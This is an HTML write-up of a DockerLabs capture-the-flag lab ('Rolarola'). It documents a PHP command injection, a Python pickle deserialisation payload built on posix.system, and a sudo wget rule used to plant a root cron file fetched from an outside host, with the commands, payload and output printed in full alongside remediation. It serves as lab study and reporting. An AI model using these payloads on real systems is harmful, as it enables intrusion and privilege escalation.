@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 189 Rolarola &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Rolarola</p><h1 id="rolarola--dockerlabs-lab-id-189-medio">ROLAROLA — DockerLabs lab (id 189, &quot;Medio&quot;)</h1>
+<blockquote>
+<p>Lab description from the catalogue (<code>[lab-home]/dockerlabs/catalog.txt:27</code>):
+<em>&quot;En esta máquina se explota la vulnerabilidad command injection, lo cual permite
+obtener una shell en el sistema como usuario no privilegiado. Posteriormente se
+explota la vulnerabilidad pickle deserialization en python para escalar a root&quot;</em>.</p>
+</blockquote>
+<p><strong>Outcome: solved — 3 hops, <code>uid=100(apache)</code> → <code>uid=1000(matsi)</code> → <code>uid=0(root)</code>.
+Both advertised classes are really present, and both are filed separately in §3
+because they are genuinely distinct bugs with distinct entry criteria. One third
+material correction to the description is recorded in §2: the pickle sink does
+<strong>not</strong> escalate to root, and I can prove it. No reward artifact exists (§8).</strong></p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<h3 id="11-tcp-scan-verbatim">1.1 TCP scan (verbatim)</h3>
+<pre><code>$ nmap -sV -Pn -p- --open -T4 [net-0-7]
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 04:24 +0000
+Nmap scan report for [net-0-7]
+Host is up (0.000048s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.66 ((Unix))
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
+</code></pre>
+<p>The &quot;trípleta&quot;, run in order:</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reachable</strong></td>
+<td><code>80/tcp</code> open, Apache httpd 2.4.66. <code>GET /</code> → <code>HTTP 200</code>, <strong>478 bytes</strong>.</td>
+</tr>
+<tr>
+<td><strong>What the body carries</strong></td>
+<td>A <code>POST</code> form with one field <code>nombre</code> (<code>index.php:20-23</code>), a reflection at <code>index.php:26</code>, and a <code>tail -n 1 names.txt</code> reflection rendered into a JS argument at <code>index.php:32-35</code>.</td>
+</tr>
+<tr>
+<td><strong>Decisive</strong></td>
+<td><code>index.php:27</code> — <code>&lt;?php system(&quot;echo $nombre &gt;&gt; names.txt&quot;); ?&gt;</code> — a request parameter reaching a shell. That is the discriminator, and the source named it before a single request was sent.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="12-stack-and-versions--read-from-the-artefact-not-from-memory">1.2 Stack and versions — read from the artefact, not from memory</h3>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+<th>Where the fact comes from</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP server</td>
+<td>Apache httpd 2.4.66</td>
+<td><code>Server:</code> header, <code>nmap -sV</code></td>
+</tr>
+<tr>
+<td>PHP (web)</td>
+<td><strong>8.5.1</strong></td>
+<td><code>X-Powered-By: PHP/8.5.1</code>; <code>/etc/apache2/conf.d/php85-module.conf:1</code> → <code>LoadModule php_module modules/mod_php85.so</code></td>
+</tr>
+<tr>
+<td>PHP (CLI)</td>
+<td><strong>8.4.16</strong></td>
+<td><code>php -v</code> → <code>PHP 8.4.16</code>; <code>/usr/bin/php -&gt; php84</code></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Alpine Linux 3.23.2</td>
+<td><code>/etc/os-release</code></td>
+</tr>
+<tr>
+<td>Python</td>
+<td>3.12.12</td>
+<td><code>python3 -V</code>; <code>/usr/bin/python3 -&gt; python3.12</code></td>
+</tr>
+<tr>
+<td>Init</td>
+<td><code>/bin/sh -c &quot;bash /root/entrypoint.sh &amp;&amp; tail -f /dev/null&quot;</code></td>
+<td><code>docker inspect -f '{{.Config.Cmd}}' rolarola:latest</code></td>
+</tr>
+<tr>
+<td>Entrypoint</td>
+<td>3 effective lines</td>
+<td><code>/root/entrypoint.sh:6-7</code> → <code>httpd &amp;</code> and <code>crond &amp;</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The PHP version is two different numbers and both are correct.</strong> The web SAPI is
+<code>mod_php85.so</code> (8.5.1) while the only PHP binary in the image is <code>php84</code> (8.4.16).
+A CVE range recalled from memory would have been a guess against the wrong number;
+both numbers are recorded so neither is.</p>
+<p><code>auto_deploy.sh</code> does not exist in this image, and I did not run anything resembling
+it. <code>docker inspect</code> shows a <strong>single</strong> container, no compose file, and <strong>no
+<code>ExposedPorts</code></strong> at all — the image declares nothing, so the topology had to be read
+out of <code>/root/entrypoint.sh</code> and the two crontabs.</p>
+<h3 id="13-hidden-surfaces--what-the-tcp-scan-cannot-see">1.3 Hidden surfaces — what the TCP scan cannot see</h3>
+<p><code>/proc/net/tcp</code> inside the container, the method the RUNBOOK names for exactly this:</p>
+<pre><code>  sl  local_address                         rem_address   st tx_queue rx_queue ...
+   0: 0100007F:1B39 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000  0 60462884
+</code></pre>
+<p><code>0100007F:1B39</code> = <strong><code>127.0.0.1:6969</code></strong>, state <code>0A</code> = <code>LISTEN</code>, <strong>uid <code>1000</code> = matsi</strong>.
+This is the deserialisation sink, and <code>-p-</code> cannot see it. Proved as a real negative
+rather than an assumption:</p>
+<pre><code>$ nmap -Pn -p 6969 [net-0-7]
+PORT     STATE  SERVICE
+6969/tcp closed acmsoda
+</code></pre>
+<p><code>closed</code>/<code>conn-refused</code>, not <code>filtered</code> — the socket is bound to loopback, so the
+kernel answers. <strong>Work count: 1 port probed, 1 connect-refused.</strong> The absence from
+the scan is a property of the bind address, not evidence of absence of the service.</p>
+<p>Port 80 does not appear in <code>/proc/net/tcp</code> at all; it is in <code>/proc/net/tcp6</code> as
+<code>00000000000000000000000000000000:0050</code>, an IPv6 wildcard, which is why the
+IPv4-mapped entries <code>...FFFF0000070011AC:0050</code> show up as established. Two listening
+sockets, one of them invisible to <code>nmap -p-</code> on the interface it is bound to.</p>
+<p><strong>UDP:</strong> <code>/proc/net/udp</code> and <code>/proc/net/udp6</code> are both <strong>empty — 0 rows returned.</strong>
+That is a measured negative with a work count, not an untested one.</p>
+<h3 id="14-the-second-unauthenticated-service--and-who-starts-it">1.4 The second, unauthenticated service — and who starts it</h3>
+<p>Neither <code>httpd</code> nor <code>app.py</code> is started by the entrypoint in the way a reader would
+assume. <code>ps aux</code> inside the container:</p>
+<pre><code>PID   USER     COMMAND
+    1 root      tail -f /dev/null
+   11 root      httpd
+   12 apache    httpd
+   18 matsi     python3 [lab-home]/matsi/proyect/app.py
+   17 root      {crond} CROND
+</code></pre>
+<p><code>app.py</code> runs as <strong>matsi</strong> because of <strong>matsi's own crontab</strong>:</p>
+<pre><code>$ su - matsi -c &quot;crontab -l&quot;
+* * * * * python3 [lab-home]/matsi/proyect/app.py
+</code></pre>
+<p>That is why the service is <code>uid 1000</code> in <code>/proc/net/tcp</code> and not root, and it is the
+single most important fact for reading the escalation: the deserialisation sink runs
+at <code>uid 1000</code>, so it <strong>cannot</strong> be the thing that reaches root. See §2.</p>
+<hr />
+<h2 id="2-which-of-the-two-declared-classes-is-actually-present">2. Which of the two declared classes is actually present</h2>
+<p><strong>Both. They are two distinct bugs, not one bug and its escalation.</strong> I am filing
+them separately (F1, F2) because each has its own entry criterion, and fixing either
+one alone leaves the other fully exploitable.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Class</th>
+<th>Entry criterion — the question that starts it</th>
+<th>Source that settled it</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>F1</strong></td>
+<td>OS command injection, CWE-78</td>
+<td>Does an unauthenticated request parameter reach a shell?</td>
+<td><code>index.php:27</code></td>
+</tr>
+<tr>
+<td><strong>F2</strong></td>
+<td>Unsafe deserialisation, CWE-502</td>
+<td>Does <code>pickle.loads</code> run on bytes that came off a socket?</td>
+<td><code>app.py:43</code>, fed by <code>app.py:74</code></td>
+</tr>
+</tbody>
+</table>
+<p>F2's entry criterion is <strong>independent of F1 and does not require it</strong>: the service
+listens on loopback with <strong>no authentication whatsoever</strong> (<code>app.py:48-80</code> — there is
+no credential check, no token, no uid check), so <em>any</em> local uid that can open a TCP
+connection to <code>127.0.0.1:6969</code> can plant a pickle and trigger it. In this lab the
+only remote way onto the box is F1, so F1 is the remote entry and F2 is the local
+one — but the two bugs are not chained to each other, and a report that merged them
+would tell the client that patching the PHP form fixed the deserialisation.</p>
+<h3 id="21-what-the-description-got-wrong">2.1 What the description got wrong</h3>
+<p>The description says the pickle deserialisation is what <em>&quot;escala a root&quot;</em>. Measured,
+it is not:</p>
+<pre><code># executed by the deserialising process, from inside the sink:
+$ pwd
+[lab-home]/matsi
+$ id
+uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)
+</code></pre>
+<p>The pickle sink's ceiling is <strong><code>matsi</code></strong>, and it has been measured three separate
+times (§4, hops 1 and 2). The step that actually reaches root is a third, entirely
+different bug: the <code>sudoers</code> rule at <strong><code>/etc/sudoers:123</code></strong></p>
+<pre><code>matsi ALL=(ALL:ALL) NOPASSWD: /usr/bin/wget
+</code></pre>
+<p>with <strong>no argument restriction</strong>, which is a privilege escalation in its own right
+(F5). So the real shape of the lab is three bugs, and the lab's own description
+mis-attributes the third to the second. The correct statement is: <em>command injection
+gets you <code>apache</code>; pickle gets you <code>matsi</code>; a sudoers rule gets you <code>root</code>.</em></p>
+<h3 id="22-convergence-note">2.2 Convergence note</h3>
+<p><code>corpus/INDEX.md:35</code> already carries a pickle row — lab 148, where pickle is a
+<strong>gadget in a stack buffer overflow</strong>. Per PIPELINE.md §&quot;Feeding forward&quot;, an
+existing rule that survives a fresh case is stronger than a new rule with one, and
+the honest outcome here is <strong>extend, do not duplicate</strong>: our deserialisation
+coverage is not &quot;pickle-only, one instance&quot;. Lab 148 exercises pickle as a <em>gadget
+reached through memory corruption in C</em>; lab 189 exercises <code>pickle.loads()</code> directly
+on <em>untrusted network bytes in Python</em>, which is CWE-502 on its own terms and a
+different trust boundary. The gap named in <code>tooling/labs.manifest:69</code> is closed by
+this row, and it closes by widening an existing class rather than by adding one.</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="f1--unauthenticated-os-command-injection-cwe-78-critical">F1 — Unauthenticated OS command injection, CWE-78 (Critical)</h3>
+<p><strong>Location:</strong> <code>/var/www/localhost/htdocs/index.php:27</code></p>
+<pre><code class="language-php"> 4: if ($_SERVER[&quot;REQUEST_METHOD&quot;] === &quot;POST&quot;) {
+ 5:     $nombre = htmlspecialchars($_POST[&quot;nombre&quot;]);
+ 6: }
+...
+25: &lt;?php if ($nombre): ?&gt;
+26:     &lt;p class=&quot;saludo&quot;&gt;Hola &lt;strong&gt;&lt;?php echo $nombre; ?&gt;&lt;/strong&gt;, bienvenido 😎&lt;/p&gt;
+27:     &lt;?php system(&quot;echo $nombre &gt;&gt; names.txt&quot;); ?&gt;
+</code></pre>
+<p><strong>Entry criterion satisfied:</strong> <code>POST nombre</code> reaches a shell. No authentication, no
+<code>required</code> server-side check, no rate limit, no CSRF token.</p>
+<p><strong>Root cause:</strong> a sanitiser for the <strong>wrong context</strong>. <code>htmlspecialchars()</code> at
+<code>index.php:5</code> is an HTML-escaping function applied to a value that is then
+interpolated into a <strong>shell command</strong> at line 27. It escapes <code>&amp; &quot; ' &lt; &gt;</code> and leaves
+<code>; | $ ( ) \</code> ` and newline untouched. Context confusion, not a missing filter.</p>
+<p><strong>Positive control — the payload reached the sink, with an observable effect.</strong>
+A <code>200</code> rendering a page proves nothing, so the control is built to be
+<em>discriminating</em>: the same request is rendered in two places, and the two must
+disagree if the <strong>shell</strong> (not PHP) evaluated the payload.</p>
+<pre><code>$ curl -s -X POST --data-urlencode 'nombre=A189-$(id)' http://[net-0-7]/ | grep -n 'Hola\|button('
+18:    &lt;p class=&quot;saludo&quot;&gt;Hola &lt;strong&gt;A189-$(id)&lt;/strong&gt;, bienvenido 😎&lt;/p&gt;
+22:&lt;button onclick='button(&quot;A189-uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)&quot;)'&gt;
+</code></pre>
+<p>Line 18 shows the <strong>literal, unevaluated</strong> string — that is PHP echoing the variable.
+Line 22 shows the <strong>real <code>id</code> output</strong> — that is <code>/bin/sh</code> running the subshell, read
+back out of <code>names.txt</code> by <code>index.php:32</code>. Same request, two renders, one of them
+transformed by a shell. There is no way to produce that pair without the sink firing.</p>
+<p>Independent second oracle, read off the filesystem:</p>
+<pre><code>$ ls -l /var/www/localhost/htdocs/names.txt
+-rw-r--r-- 1 apache apache 93 ... names.txt
+$ cat -A names.txt
+BASELINE189$
+A189-uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)$
+</code></pre>
+<p><strong>Identity at this hop, measured:</strong> <code>uid=100(apache) gid=101(apache)</code>. Not assumed
+from the Apache config — printed by the payload, twice, plus a third time in §4.</p>
+<p><strong>Impact:</strong> unauthenticated remote code execution as <code>apache</code>, with the command's
+<strong>stdout retrievable over plain HTTP</strong> (see F3). From <code>apache</code> the loopback pickle
+service is one <code>connect()</code> away, which is how F2 is reached in this lab.</p>
+<p><strong>Remediation:</strong> do not build a shell command out of request data. If a shell is
+unavoidable, pass the value as an argument (<code>system('printf %s ', $argv)</code>) or use
+<code>escapeshellarg()</code>. The HTML context needs <code>htmlspecialchars()</code> and the shell context
+needs <code>escapeshellarg()</code>; using one for the other is the bug. A denylist over shell
+metacharacters is not a fix — F1's own sink proves the character set is not the
+boundary.</p>
+<h3 id="f2--unsafe-deserialisation-of-untrusted-data-cwe-502-critical">F2 — Unsafe deserialisation of untrusted data, CWE-502 (Critical)</h3>
+<p><strong>Location:</strong> <code>[lab-home]/matsi/proyect/app.py:43</code>, fed by <code>app.py:74</code></p>
+<pre><code class="language-python">22: def guardar_objetivo(blob):
+23:     with open(DATA_FILE, &quot;ab&quot;) as f:
+24:         size = len(blob).to_bytes(4, &quot;big&quot;)
+25:         f.write(size + blob)   # guarda RAW, no pickle
+26:
+28: def leer_objetivos():
+...
+34:     with open(DATA_FILE, &quot;rb&quot;) as f:
+35:         while True:
+36:             size_bytes = f.read(4)
+37:             if not size_bytes:
+38:                 break
+39:             size = int.from_bytes(size_bytes, &quot;big&quot;)
+40:             data = f.read(size)
+43:             objetivos.append(pickle.loads(data))    # &lt;-- SINK
+...
+73:             send(conn, &quot;Objetivo: &quot;)
+74:             blob = recv_bytes(conn)                 # &lt;-- ATTACKER BYTES
+75:
+76:             guardar_objetivo(blob)
+</code></pre>
+<p><strong>Entry criterion satisfied:</strong> the sink is <code>pickle.loads()</code> on bytes that arrived
+from a socket. The author even documented the design in the comment at line 25 —
+<code>guarda RAW, no pickle</code> — and then fed the raw bytes straight back into a pickle
+loader. The comment is about the <em>storage format</em>, and the storage format is
+irrelevant: the deserialisation happens on the way back out, on data that never had
+to be a valid pickle in the first place.</p>
+<p><strong>Entry criterion is independent of F1:</strong> <code>app.py:48-80</code> implements a two-option menu
+with <strong>no authentication of any kind</strong>. Any local uid can connect, choose <code>2</code>, write
+a name, an age and a raw blob, then choose <code>1</code> to trigger it.</p>
+<p><strong>Positive control — the payload reached the sink and executed.</strong> The wire protocol
+is length-prefixed raw bytes, and the stored file proves the frames landed:</p>
+<pre><code>$ python3 -c &quot;walk the 4-byte BE length prefixes in [lab-home]/matsi/objetivos.bin&quot;
+frame 1: len=211 first16=b'cposix\nsystem\np0'
+frame 2: len=302 first16=b'cposix\nsystem\np0'
+frame 3: len=455 first16=b'cposix\nsystem\np0'
+frame 4: len=433 first16=b'cposix\nsystem\np0'
+frame 5: len=559 first16=b'cposix\nsystem\np0'
+frames: 5 bytes consumed: 1980 of 1980
+</code></pre>
+<p><code>5</code> frames, <code>1980 of 1980</code> bytes consumed — the walk terminates exactly on the file
+length, so the format is confirmed rather than assumed. Every frame begins with
+<code>cposix\nsystem\np0</code>, the <code>GLOBAL</code>/<code>STACK_GLOBAL</code> preamble for the <code>posix.system</code>
+reducer. Frame 1 in full:</p>
+<pre><code>cposix
+system
+p0
+(Vid &gt; [lab-home]/matsi/pickle189.proof ; whoami &gt;&gt; [lab-home]/matsi/pickle189.proof ;
+ echo 6f14fac1551a67a9f9aeeff1 &gt;&gt; [lab-home]/matsi/pickle189.proof ; sudo -n -l &gt;&gt; [lab-home]/matsi/pickle189.proof
+p1
+tp2
+Rp3
+.
+</code></pre>
+<p><strong>The vector's oracle is the <code>- N</code> in the option-1 reply, and it is weak, so I did
+not rely on it.</strong> <code>app.py:63</code> sends <code>f&quot;- {o}\n&quot;</code> where <code>o</code> is the return value of
+<code>os.system</code>, i.e. an <strong>exit code</strong>:</p>
+<pre><code>WRITE_REPLY: [+] Objetivo guardado
+READ_REPLY: --- OBJETIVOS --- | - 0
+</code></pre>
+<p><code>- 0</code> is &quot;the command chain exited 0&quot;. That is a real observation but it is <em>not</em>
+proof of <em>which</em> uid ran it or <em>what</em> it did — an exit code is forgeable by any
+payload. So I manufactured the oracle the RUNBOOK asks for.</p>
+<p><strong>Manufactured oracle — a path only the target identity can create.</strong> The marker
+file goes to <code>[lab-home]/matsi/</code>, which is <code>drwxr-s--- matsi matsi</code>. Before exploiting, I
+proved hop 1's identity <strong>cannot</strong> write there, with a green positive control on both
+detectors:</p>
+<pre><code>### run as uid=100(apache) through F1:
+matsi_writable=1      &lt;- test -w [lab-home]/matsi  : NOT writable
+tmp_writable=0        &lt;- test -w /tmp          : writable  (detector works)
+matsi_touch_rc=1      &lt;- touch [lab-home]/matsi/apache_cannot.proof : failed
+tmp_touch_rc=0        &lt;- touch /tmp/apache_can189.proof       : succeeded (detector works)
+</code></pre>
+<p>Filesystem confirmation: <code>[lab-home]/matsi/apache_cannot.proof</code> <strong>absent</strong>,
+<code>/tmp/apache_can189.proof</code> present, <code>-rw-r--r-- 1 apache apache 0</code>. The path is
+identity-restricted, and hop 1 is excluded from creating it.</p>
+<p>Then the pickle executed, and the marker appeared:</p>
+<pre><code>$ ls -l [lab-home]/matsi/pickle189.proof
+-rw-r--r-- 1 matsi matsi 437 ... [lab-home]/matsi/pickle189.proof
+$ cat -A [lab-home]/matsi/pickle189.proof
+uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)$
+matsi$
+6f14fac1551a67a9f9aeeff1$
+Matching Defaults entries for matsi on 53087e4a6eba:$
+...
+User matsi may run the following commands on 53087e4a6eba:$
+    (ALL : ALL) NOPASSWD: /usr/bin/wget$
+</code></pre>
+<p>Four independent facts in one artefact: <strong>owner <code>matsi(1000)</code></strong>, <code>id</code> reporting
+<code>uid=1000</code>, <code>whoami</code> reporting <code>matsi</code>, and a <strong>12-byte random token</strong>
+<code>6f14fac1551a67a9f9aeeff1</code> generated on the host before the run, which is what makes
+the file distinguishable from anything pre-existing. The deserialisation ran as
+<strong><code>matsi</code></strong>, which is the identity of the <em>app process</em>, not of whoever sent the bytes
+— the sender was <code>apache</code>, and the file's owner proves the receiving end, not the
+sending one.</p>
+<p><strong>Impact:</strong> arbitrary command execution as <code>matsi</code> for any local uid that can reach
+the loopback port. Combined with F5 this is a full path to root, but the two must be
+patched separately.</p>
+<p><strong>Remediation:</strong> never <code>pickle.loads()</code> on data you did not create. Use <code>json</code>, or a
+schema-validated format. If pickle is unavoidable, <code>hmac</code>-sign the blob and verify
+before loading — a signature check <em>before</em> <code>pickle.loads</code> is the whole control.
+Independently: the service needs authentication, and it should not accept raw bytes
+from a socket at all. Note the 4096-byte single-<code>recv</code> at <code>app.py:19</code> also truncates
+silently, which is a correctness bug independent of the security one.</p>
+<h3 id="f3--command-output-written-to-a-web-served-file-cwe-532-high">F3 — Command output written to a web-served file, CWE-532 (High)</h3>
+<p><strong>Consequence of F1 with an independent impact, so it is filed separately.</strong></p>
+<p><code>index.php:27</code> appends the command's <strong>stdout</strong> to <code>names.txt</code>, and <code>names.txt</code> lives
+<strong>inside the document root</strong> at <code>/var/www/localhost/htdocs/names.txt</code>, served by
+<code>DirectoryIndex</code>-adjacent static handling with no access control:</p>
+<pre><code>$ curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://[net-0-7]/names.txt
+GET /names.txt -&gt; HTTP 200, 3084 bytes
+</code></pre>
+<p><strong>Work count: 1 request, 1 file, 3084 bytes of accumulated command output returned
+unauthenticated.</strong> The injection is therefore not blind: an attacker who cannot
+maintain a channel to the target can still <strong>exfiltrate through the browser-facing
+origin</strong>, and every other user's submissions are readable too. <code>names.txt</code> also
+grows without bound, since every POST appends a line and nothing truncates it.</p>
+<p><strong>Remediation:</strong> never write command output into the document root. Use a path
+outside it with restrictive permissions, or return results in the response body only
+to the requester.</p>
+<h3 id="f4--source-disclosure-via-a-world-readable-leftover-git-cwe-527--cwe-732-medium">F4 — Source disclosure via a world-readable leftover <code>.git</code>, CWE-527 / CWE-732 (Medium)</h3>
+<p><strong>Location:</strong> <code>/opt/.git</code> — a complete git repository, root-owned, with an <strong>empty
+working tree</strong>, that the image ships. <code>/opt</code> is <code>drwxr-xr-x root root</code> and
+<code>/opt/.git</code> is <code>drwxr-sr-x root root</code>, so <strong>every uid on the box can traverse and
+read it</strong>, while the project's own directory is correctly private:</p>
+<pre><code>$ stat -c '%n %A %U' /opt /opt/.git [lab-home]/matsi [lab-home]/matsi/proyect
+/opt                drwxr-xr-x root
+/opt/.git           drwxr-sr-x root
+[lab-home]/matsi         drwxr-s--- matsi
+[lab-home]/matsi/proyect drwxr-x--- matsi
+</code></pre>
+<p><code>git -C /opt ls-tree -r HEAD</code> → <code>app.py</code>, <code>objetivos.bin</code>, commit <code>119ed67 Mi primer commit?</code> — the same commit as <code>[lab-home]/matsi/proyect</code>. The disclosure is
+real, and it is specifically the disclosure of <strong>the deserialisation sink</strong>:</p>
+<pre><code>$ su -s /bin/sh apache -c &quot;git -c safe.directory=/opt -C /opt show HEAD:app.py | sed -n '40,45p'&quot;
+            size = int.from_bytes(size_bytes, &quot;big&quot;)
+            data = f.read(size)
+
+            objetivos.append(pickle.loads(data))
+git_rc=0
+
+$ su -s /bin/sh apache -c &quot;cat [lab-home]/matsi/proyect/app.py&quot;
+apache_read_rc=1
+cat: can't open '[lab-home]/matsi/proyect/app.py': Permission denied
+</code></pre>
+<p>Two-sided and decisive: the <em>same file</em> is readable by <code>apache</code> via <code>/opt/.git</code>
+(<code>git_rc=0</code>, sink source returned) and <strong>not</strong> readable at its intended location
+(<code>apache_read_rc=1</code>, <code>Permission denied</code>). The <code>0750</code> on the project directory is
+completely defeated by the copy left in <code>/opt</code>. An attacker who has any low-privilege
+foothold on this host — including the <code>apache</code> shell that F1 hands out for free —
+reads the exact line number of the pickle sink and the exact wire protocol needed to
+drive it, with no reverse engineering.</p>
+<p><strong>Remediation:</strong> delete <code>/opt/.git</code> from the image (or <code>/opt</code> entirely — it has no
+other content). Build artefacts, VCS metadata and empty staging directories have no
+business in a shipped image.</p>
+<h3 id="f5--sudoers-grants-a-root-shell-to-a-downloader-cwe-250--cwe-269-critical">F5 — <code>sudoers</code> grants a root shell to a downloader, CWE-250 / CWE-269 (Critical)</h3>
+<p><strong>Location:</strong> <code>/etc/sudoers:123</code></p>
+<pre><code>122: root ALL=(ALL:ALL) ALL
+123: matsi ALL=(ALL:ALL) NOPASSWD: /usr/bin/wget
+</code></pre>
+<p><code>sudoers</code> command entries without an argument list permit <strong>any arguments</strong>. <code>wget</code>
+can write anywhere, so this is not &quot;matsi may download a file&quot;, it is &quot;matsi may ask
+root to create or overwrite any file on the system&quot;:</p>
+<pre><code>$ sudo -n /usr/bin/wget -q -O /etc/cron.d/p189 http://[net-0-1]:9099/p189.cron
+escalate_rc=0
+$ ls -l /etc/cron.d/p189
+-rw-r--r-- 1 root root 94 ... /etc/cron.d/p189
+</code></pre>
+<p><code>/etc/cron.d</code> is <code>drwxr-xr-x root root</code> and I had already measured
+<code>crond_writable=1</code> from <code>matsi</code> — matsi cannot write there. The planted file is owned
+by <strong>root</strong>, which is the discriminator: a file created through <code>sudo wget</code> is
+root-owned, while the same <code>wget</code> without <code>sudo</code> produced
+<code>/tmp/sudow189.txt</code> owned by <code>matsi</code>.</p>
+<p><strong>This is the lab's actual root step, and the lab's description attributes it to the
+pickle bug (§2.1).</strong> Patching the deserialisation does not remove this.</p>
+<p><strong>Remediation:</strong> remove the rule. If <code>matsi</code> genuinely needs to fetch a file, allow a
+specific wrapper with a fixed destination, and never grant a general-purpose
+downloader <code>NOPASSWD</code> root.</p>
+<hr />
+<h2 id="4-the-chain">4. The chain</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>uid=100(apache)</code></td>
+<td><strong>F1</strong> — <code>POST nombre</code> → <code>index.php:27</code> <code>system(&quot;echo $nombre &gt;&gt; names.txt&quot;)</code>. <code>htmlspecialchars</code> does not touch <code>$( )</code>.</td>
+<td><code>uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)</code> — rendered into the page at <code>index.php:35</code>, and independently in <code>names.txt</code> on disk. Measured 3× (§1.3 tool sweep, §3 F1, §4 hop-1 pre-flight).</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>uid=1000(matsi)</code></td>
+<td><strong>F2</strong> — from the <code>apache</code> shell, <code>connect()</code> to <code>127.0.0.1:6969</code> (loopback, uid 1000, no auth), write a <code>posix.system</code> pickle via menu option <code>2</code>, then trigger <code>pickle.loads</code> via option <code>1</code>.</td>
+<td><code>[lab-home]/matsi/pickle189.proof</code> owner <strong><code>matsi(1000)</code></strong>, <code>drwxr-s---</code> parent, contents <code>uid=1000(matsi)</code> / <code>matsi</code> / token <code>6f14fac1551a67a9f9aeeff1</code>. Negative control first: hop 1 is provably unable to create that path (<code>matsi_touch_rc=1</code>, file absent).</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>uid=0(root)</code></td>
+<td><strong>F5</strong> + cron — as <code>matsi</code>, write a crontab line to <code>/tmp</code>, then <code>sudo -n /usr/bin/wget -O /etc/cron.d/p189 http://&lt;engagement-host&gt;:9099/p189.cron</code>. <code>crond</code> (started by <code>entrypoint.sh:7</code> as root) executes it.</td>
+<td><code>/root/root189.proof</code>, <strong>owner <code>root</code></strong>, inside <code>/root</code> which is <code>drwx------</code> and measured <code>root_writable=1</code> from <code>matsi</code>: <code>uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),…</code> + token <code>6f14fac1551a67a9f9aeeff1</code>.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Hop 3's oracle was manufactured before the exploit, not reported afterwards.</strong> The
+escalation vector here has no inherent output — crond runs silently — so the claim
+&quot;this cron runs my script as root&quot; would have been a statement about the future. What
+I did instead: pre-state measured (<code>ls -l /root/root189.proof</code> → <code>Permission denied</code>
+from <code>matsi</code>, and <code>root_writable=1</code>), then a cron line whose only job is to write a
+<strong>root-owned file into a 0700 root-only path carrying a token generated before the
+run</strong>, then a poll for its appearance. It appeared within ~10 s:</p>
+<pre><code>-rw-r--r-- 1 root root 163 ... /root/root189.proof
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)$
+6f14fac1551a67a9f9aeeff1$
+</code></pre>
+<p>An escalation that had not worked would have been filed separately; this one worked,
+and the file above is the result, not the prediction.</p>
+<p><strong>Also established while in the sink, because the RUNBOOK asks for the execution
+identity at every hop — including the CWD, which <code>DATA_FILE</code> at <code>app.py:7</code> leaves
+relative:</strong></p>
+<pre><code>$ pwd ; $ id ; $ env | sort
+[lab-home]/matsi
+uid=1000(matsi) gid=1000(matsi) groups=1000(matsi)
+HOME=[lab-home]/matsi
+LOGNAME=matsi
+PATH=/bin:/usr/bin:/sbin:/dev/null
+PWD=[lab-home]/matsi
+SHELL=/bin/sh
+SHLVL=2
+USER=matsi
+</code></pre>
+<p><code>PWD=[lab-home]/matsi</code> is the direct proof that the relative <code>objetivos.bin</code> at
+<code>app.py:7</code> resolves inside <code>matsi</code>'s home — which is why <code>apache</code> never needed any
+filesystem access to plant a frame. It only needed to write bytes to a socket; the
+<strong>app process</strong>, running as <code>matsi</code>, did the writing. I initially mis-attributed that
+write to <code>apache</code> and corrected it: <code>[lab-home]/matsi</code> is <code>0750</code>, so <code>apache</code> provably
+cannot create anything in it, and the file is <code>matsi</code>-owned.</p>
+<hr />
+<h2 id="5-controls-that-held">5. Controls that held</h2>
+<p>Each with the positive control that proves the detector can fire. A control that has
+never seen a success is not a control.</p>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>sudo</code> is not blanket.</strong> Only <code>wget</code> is passwordless.</td>
+<td><code>sudo -n -l</code> <strong>succeeds without a password</strong> and prints the allowed set, so the mechanism is demonstrably live; then two non-matching commands are refused.</td>
